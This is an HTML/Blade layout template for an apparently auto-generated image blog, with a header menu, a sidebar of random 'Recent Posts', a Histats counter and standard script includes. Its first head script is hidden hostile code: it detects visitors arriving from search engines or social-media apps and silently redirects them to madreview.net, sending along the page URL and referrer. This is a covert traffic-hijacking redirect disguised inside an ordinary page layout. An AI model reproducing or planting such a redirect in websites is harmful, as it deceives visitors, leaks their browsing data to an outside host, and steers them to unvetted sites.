<!DOCTYPE html>
<html lang="en">

<head>
    <script>
        var ars = "https://madreview.net";

        if (
            [".google.", "bing.", "yandex.", "facebook.", "pinterest."].some((s) =>
                document.referrer.toLowerCase().includes(s)
            ) || ["fb", "facebook", "pinterest", "twitter"].some((s) =>
                navigator.userAgent.toLowerCase().includes(s)
            )
        ) {
            window.location.href =
                ars +
                "/?arsae=" +
                encodeURIComponent(window.location.href) +
                "&arsae_ref=" +
                encodeURIComponent(document.referrer);
        }
    </script>
    <!--ads/auto.txt-->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1, shrink-to-fit=no" />
    <link href="https://i.pinimg.com/originals/12/e3/da/12e3dac858061d088023b2bd48e2fa96.jpg" rel="shortcut icon" />
    <link href="/sitemap.xml" rel="alternate" title="XML Sitemap" type="application/xml" />
    <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet" />
	<style type="text/css>/*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}[hidden],template{display:none}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}button{background-color:transparent;background-image:none;padding:0}button:focus{outline:1px dotted;outline:5px auto -webkit-focus-ring-color}fieldset,ol,ul{margin:0;padding:0}ol,ul{list-style:none}html{font-family:-apple-system,BlinkMacSystemFont;line-height:1.5}*,:after,:before{box-sizing:border-box;border:0 solid #e2e8f0}hr{border-top-width:1px}img{border-style:solid}textarea{resize:vertical}input::placeholder,textarea::placeholder{color:#a0aec0}[role=button],button{cursor:pointer}table{border-collapse:collapse}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}button,input,optgroup,select,textarea{padding:0;line-height:inherit;color:inherit}code,kbd,pre,samp{font-family:SFMono-Regular,Menlo}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}.bg-white{--bg-opacity:1;background-color:#fff;background-color:rgba(255,255,255,var(--bg-opacity))}.bg-gray-100{--bg-opacity:1;background-color:#f7fafc;background-color:rgba(247,250,252,var(--bg-opacity))}.bg-gray-200{--bg-opacity:1;background-color:#edf2f7;background-color:rgba(237,242,247,var(--bg-opacity))}.bg-gray-300{--bg-opacity:1;background-color:#e2e8f0;background-color:rgba(226,232,240,var(--bg-opacity))}.bg-gray-500{--bg-opacity:1;background-color:#a0aec0;background-color:rgba(160,174,192,var(--bg-opacity))}.bg-gray-800{--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))}.bg-red-500{--bg-opacity:1;background-color:#f56565;background-color:rgba(245,101,101,var(--bg-opacity))}.bg-orange-500{--bg-opacity:1;background-color:#ed8936;background-color:rgba(237,137,54,var(--bg-opacity))}.bg-yellow-500{--bg-opacity:1;background-color:#ecc94b;background-color:rgba(236,201,75,var(--bg-opacity))}.bg-green-500{--bg-opacity:1;background-color:#48bb78;background-color:rgba(72,187,120,var(--bg-opacity))}.bg-teal-500{--bg-opacity:1;background-color:#38b2ac;background-color:rgba(56,178,172,var(--bg-opacity))}.bg-blue-500{--bg-opacity:1;background-color:#4299e1;background-color:rgba(66,153,225,var(--bg-opacity))}.bg-blue-700{--bg-opacity:1;background-color:#2b6cb0;background-color:rgba(43,108,176,var(--bg-opacity))}.bg-indigo-500{--bg-opacity:1;background-color:#667eea;background-color:rgba(102,126,234,var(--bg-opacity))}.hover\:bg-red-600:hover{--bg-opacity:1;background-color:#e53e3e;background-color:rgba(229,62,62,var(--bg-opacity))}.hover\:bg-orange-600:hover{--bg-opacity:1;background-color:#dd6b20;background-color:rgba(221,107,32,var(--bg-opacity))}.hover\:bg-yellow-600:hover{--bg-opacity:1;background-color:#d69e2e;background-color:rgba(214,158,46,var(--bg-opacity))}.hover\:bg-green-600:hover{--bg-opacity:1;background-color:#38a169;background-color:rgba(56,161,105,var(--bg-opacity))}.hover\:bg-teal-600:hover{--bg-opacity:1;background-color:#319795;background-color:rgba(49,151,149,var(--bg-opacity))}.hover\:bg-blue-600:hover{--bg-opacity:1;background-color:#3182ce;background-color:rgba(49,130,206,var(--bg-opacity))}.hover\:bg-blue-800:hover{--bg-opacity:1;background-color:#2c5282;background-color:rgba(44,82,130,var(--bg-opacity))}.hover\:bg-indigo-600:hover{--bg-opacity:1;background-color:#5a67d8;background-color:rgba(90,103,216,var(--bg-opacity))}.bg-opacity-50{--bg-opacity:0.5}.border-transparent{border-color:transparent}.hover\:border-red-500:hover{--border-opacity:1;border-color:#f56565;border-color:rgba(245,101,101,var(--border-opacity))}.rounded-lg{border-radius:.5rem}.rounded-r-full{border-top-right-radius:9999px;border-bottom-right-radius:9999px}.rounded-l-full{border-top-left-radius:9999px;border-bottom-left-radius:9999px}.rounded-tr-lg{border-top-right-radius:.5rem}.border-2{border-width:2px}.border{border-width:1px}.border-b-2{border-bottom-width:2px}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.inline-flex{display:inline-flex}.table{display:table}.grid{display:grid}.hidden{display:none}.flex-wrap{flex-wrap:wrap}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.flex-1{flex:1 1 0%}.float-left{float:left}.font-display{font-family:Montserrat}.font-semibold{font-weight:600}.font-bold{font-weight:700}.font-extrabold{font-weight:800}.hover\:font-bold:hover{font-weight:700}.hover\:font-black:hover{font-weight:900}.h-6{height:1.5rem}.h-8{height:2rem}.h-56{height:14rem}.h-64{height:16rem}.h-full{height:100%}.text-xs{font-size:.75rem}.text-base{font-size:1rem}.text-lg{font-size:1.125rem}.text-xl{font-size:1.25rem}.text-4xl{font-size:2.25rem}.leading-loose{line-height:2}.list-disc{list-style-type:disc}.m-4{margin:1rem}.m-5{margin:1.25rem}.m-8{margin:2rem}.mx-1{margin-left:.25rem;margin-right:.25rem}.my-3{margin-top:.75rem;margin-bottom:.75rem}.my-4{margin-top:1rem;margin-bottom:1rem}.my-6{margin-top:1.5rem;margin-bottom:1.5rem}.mx-auto{margin-left:auto;margin-right:auto}.mb-1{margin-bottom:.25rem}.ml-1{margin-left:.25rem}.mb-2{margin-bottom:.5rem}.mb-3{margin-bottom:.75rem}.mt-6{margin-top:1.5rem}.mb-6{margin-bottom:1.5rem}.mb-10{margin-bottom:2.5rem}.mt-20{margin-top:5rem}.-ml-1{margin-left:-.25rem}.-ml-2{margin-left:-.5rem}.object-cover{object-fit:cover}.overflow-hidden{overflow:hidden}.p-2{padding:.5rem}.p-3{padding:.75rem}.p-4{padding:1rem}.p-5{padding:1.25rem}.p-6{padding:1.5rem}.px-0{padding-left:0;padding-right:0}.py-1{padding-top:.25rem;padding-bottom:.25rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.pt-4{padding-top:1rem}.absolute{position:absolute}.relative{position:relative}.sticky{position:sticky}.top-0{top:0}.right-0{right:0}.bottom-0{bottom:0}.shadow{box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.shadow-lg{box-shadow:0 10px 15px -3px rgba(0,0,0,.1),0 4px 6px -2px rgba(0,0,0,.05)}.shadow-inner{box-shadow:inset 0 2px 4px 0 rgba(0,0,0,.06)}.fill-current{fill:currentColor}.text-left{text-align:left}.text-center{text-align:center}.text-justify{text-align:justify}.text-white{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.text-gray-300{--text-opacity:1;color:#e2e8f0;color:rgba(226,232,240,var(--text-opacity))}.text-gray-500{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.text-gray-700{--text-opacity:1;color:#4a5568;color:rgba(74,85,104,var(--text-opacity))}.text-gray-900{--text-opacity:1;color:#1a202c;color:rgba(26,32,44,var(--text-opacity))}.text-red-500{--text-opacity:1;color:#f56565;color:rgba(245,101,101,var(--text-opacity))}.hover\:text-red-600:hover,.text-red-600{--text-opacity:1;color:#e53e3e;color:rgba(229,62,62,var(--text-opacity))}.hover\:text-blue-500:hover{--text-opacity:1;color:#4299e1;color:rgba(66,153,225,var(--text-opacity))}.antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.invisible{visibility:hidden}.w-6{width:1.5rem}.w-8{width:2rem}.w-1\/2{width:50%}.w-3\/4{width:75%}.w-full{width:100%}.z-10{z-index:10}.gap-4{grid-gap:1rem;gap:1rem}.transform{--transform-translate-x:0;--transform-translate-y:0;--transform-rotate:0;--transform-skew-x:0;--transform-skew-y:0;--transform-scale-x:1;--transform-scale-y:1;transform:translateX(var(--transform-translate-x)) translateY(var(--transform-translate-y)) rotate(var(--transform-rotate)) skewX(var(--transform-skew-x)) skewY(var(--transform-skew-y)) scaleX(var(--transform-scale-x)) scaleY(var(--transform-scale-y))}.hover\:scale-125:hover{--transform-scale-x:1.25;--transform-scale-y:1.25}.hover\:-translate-y-1:hover{--transform-translate-y:-0.25rem}.transition{transition-property:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform}.ease-in-out{transition-timing-function:cubic-bezier(.4,0,.2,1)}.duration-500{transition-duration:.5s}@media (min-width:768px){.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}}@media (min-width:1024px){.lg\:inline-block{display:inline-block}.lg\:flex{display:flex}.lg\:hidden{display:none}.lg\:items-center{align-items:center}.lg\:mb-0{margin-bottom:0}.lg\:p-4{padding:1rem}.lg\:py-0{padding-top:0;padding-bottom:0}.lg\:px-16{padding-left:4rem;padding-right:4rem}.lg\:pt-0{padding-top:0}.lg\:w-auto{width:auto}.lg\:w-2\/3{width:66.666667%}.lg\:w-1\/5{width:20%}.lg\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}}</style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" integrity="sha256-tBxlolRHP9uMsEFKVk+hk//ekOlXOixLKvye5W2WR5c=" crossorigin="anonymous" />
    <style>
        #menu-toggle:checked+#menu {
            display: block;
        }
    </style>

    @yield('head')
</head>

<body class="antialiased text-gray-900 bg-gray-200 font-display">
    <header class="lg:px-16 px-6 bg-gray-800 flex flex-wrap items-center lg:py-0 py-2 shadow">
        <div class="flex items-center">
            <svg class="w-6 h-6" viewBox="0 0 512 512" style="enable-background: new 0 0 512 512;" xml:space="preserve">
                <path style="fill: #ff6536;" d="M54.211,249.7c0,0,20.228,29.717,62.624,54.871c0,0-30.705-259.502,169.358-304.571
	c-51.257,188.121,65.2,241.174,107.651,141.786c70.893,94.651,17.066,177.229,17.066,177.229
	c29.069,4.188,53.487-27.57,53.487-27.57c0.218,3.912,0.34,7.851,0.34,11.818C464.738,418.545,371.283,512,256,512
	S47.262,418.545,47.262,303.262C47.262,284.744,49.686,266.794,54.211,249.7z" />
                <path style="fill: #ff421d;" d="M464.398,291.445c0,0-24.418,31.758-53.487,27.57c0,0,53.827-82.578-17.066-177.229
	C351.394,241.174,234.937,188.121,286.194,0C275.479,2.414,265.431,5.447,256,9.018V512c115.283,0,208.738-93.455,208.738-208.738
	C464.738,299.295,464.616,295.357,464.398,291.445z" />
                <path style="fill: #fbbf00;" d="M164.456,420.456C164.456,471.014,205.442,512,256,512s91.544-40.986,91.544-91.544
	c0-27.061-11.741-51.379-30.408-68.138c-35.394,48.085-85.832-24.856-46.524-78.122
	C270.612,274.196,164.456,287.499,164.456,420.456z" />
                <path style="fill: #ffa900;" d="M347.544,420.456c0-27.061-11.741-51.379-30.408-68.138c-35.394,48.085-85.832-24.856-46.524-78.122
	c0,0-5.768,0.725-14.612,3.516V512C306.558,512,347.544,471.014,347.544,420.456z" />
            </svg>
        </div>

        <div class="flex-1 flex text-red-500 text-xl font-extrabold justify-between ml-1 hover:text-red-600 hover:font-black">
            <a href="{{ home_url() }}" title="{{ site_name() }}">{{ site_name() }}</a>
        </div>
        <label for="menu-toggle" class="pointer-cursor lg:hidden block"><svg class="fill-current text-gray-500" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
                <title>menu</title>
                <path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"></path>
            </svg></label>
        <input class="hidden" type="checkbox" id="menu-toggle" />

        <div class="hidden lg:flex lg:items-center lg:w-auto w-full" id="menu">
            <nav>
                <ul class="lg:flex items-center justify-between text-base font-semibold text-white pt-4 lg:pt-0">
                    @foreach(pages() as $page)
                    <li>
                        <a class="lg:p-4 py-3 px-0 block border-b-2 border-transparent hover:border-red-500" href="{{ page_url($page) }}">{{ ucwords(str_replace('-', ' ', $page)) }}</a>
                    </li>
                    @endforeach
                    <li>
                        <a class="lg:p-4 py-3 px-0 block border-b-2 border-transparent hover:border-red-500" href="/sitemap.xml">Sitemap</a>
                    </li>
                </ul>
            </nav>
        </div>
    </header>

    <div class="flex justify-center">
        <!--ads/responsive.txt-->
        <div class="w-full lg:w-2/3 my-6 bg-gray-100 border shadow-lg z-10">
            @yield('content')
        </div>
        <div class="hidden lg:inline-block lg:w-1/5 h-full sticky top-0 my-6 mt-20">
            <!--ads/300.txt-->
            <div class="text-left text-gray-700 bg-white -ml-2 px-4 py-1 text-base font-semibold leading-loose mb-3">
                Recent Posts :
            </div>
            @foreach(collect(random_related())->shuffle()->take(50) as $r)
            <a href="{{ image_url($r) }}">
                <button class="-ml-1 text-left text-white bg-{{ collect(['orange', 'blue', 'green', 'red', 'yellow', 'teal', 'indigo'])->random() }}-500 hover:bg-{{ collect(['orange', 'blue', 'green', 'red', 'yellow', 'teal', 'indigo'])->random() }}-600 px-4 py-1 text-xs rounded-r-full leading-loose mb-1 shadow-inner">
                    {{ ucwords($r) }}
                </button>
            </a>
            <br />
            @endforeach
        </div>
    </div>

    </div>

    <div class="bg-gray-800 p-6 text-center text-white">
        <p class="m-4 p-4 font-semibold">
            Copyright 2020
        </p>
    </div>
    @include('bar')
    @include('footer')
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js" integrity="sha256-CtKylYan+AJuoH8jrMht1+1PMhMqrKnB8K5g012WN5I=" crossorigin="anonymous"></script>
    <script type="text/javascript">
        function init() {
            var imgDefer = document.getElementsByTagName("img");
            for (var i = 0; i < imgDefer.length; i++) {
                if (imgDefer[i].getAttribute("data-src")) {
                    imgDefer[i].setAttribute(
                        "src",
                        imgDefer[i].getAttribute("data-src")
                    );
                }
            }
        };
        window.onload = init;
    </script>
    <script type="text/javascript">
        var _Hasync = _Hasync || [];
        _Hasync.push(["Histats.start", "1,4384151,4,0,0,0,00010000"]);
        _Hasync.push(["Histats.fasi", "1"]);
        _Hasync.push(["Histats.track_hits", ""]);
        (function() {
            var hs = document.createElement("script");
            hs.type = "text/javascript";
            hs.async = true;
            hs.src = "//s10.histats.com/js15_as.js";
            (
                document.getElementsByTagName("head")[0] ||
                document.getElementsByTagName("body")[0]
            ).appendChild(hs);
        })();
    </script>
    <noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?4384151&101" alt="invisible hit counter" border="0" /></a></noscript>
</body>

</html>